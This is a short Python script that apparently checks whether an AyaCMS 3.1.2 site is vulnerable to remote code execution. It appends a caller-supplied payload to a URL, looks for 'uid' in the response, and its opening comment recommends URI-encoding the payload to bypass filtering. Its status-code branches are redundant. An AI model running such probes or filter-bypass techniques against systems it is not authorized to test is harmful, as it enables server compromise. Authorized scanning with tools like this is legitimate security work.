# use URI encoding for payload URI encoding bypass the filter
import requests
import sys
import argparse
import json
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


parser = argparse.ArgumentParser()
parser.add_argument("-u", "--url", help="URL to check")
parser.add_argument("-p", "--payload", help="Payload to check")
args = parser.parse_args()
if not args.url:
    parser.print_help()

url = args.url
payload = args.payload
r = requests.get(url + payload)
if r.status_code == 200:
    if "uid" in r.text:
        print("The AyaCMS 3.1.2 is vulnerable to remote code execution vulnerability")
    else:
        print("The AyaCMS 3.1.2 is not vulnerable to remote code execution vulnerability")
elif r.status_code == 500:
    print("The AyaCMS 3.1.2 is not vulnerable to remote code execution vulnerability")
elif r.status_code == 404:
    print("The AyaCMS 3.1.2 is not vulnerable to remote code execution vulnerability")
elif r.status_code == 403:
    print("The AyaCMS 3.1.2 is not vulnerable to remote code execution vulnerability")
elif r.status_code == 401:
    print("The AyaCMS 3.1.2 is not vulnerable to remote code execution vulnerability")
elif r.status_code == 400:
    print("The AyaCMS 3.1.2 is not vulnerable to remote code execution vulnerability")
elif r.status_code == 300:
    print("The AyaCMS 3.1.2 is not vulnerable to remote code execution vulnerability")
else:
    print("The AyaCMS 3.1.2 is not vulnerable to remote code execution vulnerability")
    sys.exit(1)
sys.exit(0)

